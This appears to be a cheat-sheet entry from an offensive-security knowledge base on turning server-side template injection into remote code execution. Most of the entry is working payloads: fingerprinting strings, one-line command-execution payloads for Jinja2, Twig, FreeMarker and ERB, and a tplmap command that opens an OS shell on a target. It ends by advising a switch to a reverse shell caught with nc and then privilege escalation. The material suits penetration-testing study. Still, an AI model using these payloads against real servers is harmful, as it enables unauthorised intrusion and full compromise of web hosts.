---
id: ssti-rce
title: SSTI → RCE
stage: initial-access
tags: [web]
summary: Inject template syntax into user-controlled fields to break out of the template context and execute arbitrary OS commands.
leads_to:
  - rev-shell
---

## Prerequisites

A field that reflects user input through a server-side template engine — email headers, name fields, search boxes, error messages, or any place where your input appears in the rendered HTML. The engine type determines the injection syntax.

Server-Side Template Injection happens when user input is evaluated by the template engine rather than treated as a string. Unlike XSS (client-side), SSTI runs on the server — giving you OS command execution under the web server's user. The detection payload `{{7*7}}` is safe and reliable: if you see 49 in the response, the engine is evaluating your input.

## Quick Win

> Test `{{7*7}}` in every input that reflects output — if you see 49, you have RCE.

```
{{7*7}}
${7*7}
<%= 7*7 %>
```

## Engine Fingerprinting

> Distinguish Jinja2 from Twig — both use `{{}}` but behave differently on string multiplication.

```
{{7*'7'}} → 7777777  =  Jinja2 (Python/Flask)
{{7*'7'}} → 49       =  Twig (PHP)
${7*7}    → 49       =  FreeMarker (Java) or Smarty (PHP)
<%= 7*7 %> → 49     =  ERB (Ruby/Rails)
```

## Jinja2 RCE (Flask / Python)

> Access the OS module through the object's MRO chain — multiple payloads for different filter configs.

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
```

## Twig RCE (PHP)

> Register a callback filter pointing to exec — the filter name becomes the command.

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## FreeMarker RCE (Java)

> Instantiate the Execute class directly — no classpath traversal needed.

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## ERB RCE (Ruby)

> Backtick execution is the simplest path in ERB templates.

```
<%= `id` %>
```

## Automated

> tplmap auto-detects the engine, confirms injection, and drops you into a shell.

```bash
tplmap -u "http://$TARGET/page?name=INJECT" --os-shell
```

## Leads To

Confirmed RCE → replace `id` with a reverse shell payload and catch with nc. Jinja2 on Flask is the most common OSCP/CPTS scenario — the `os.popen()` chain works on all modern Flask versions. RCE under www-data → rev-shell → linux privesc chain.
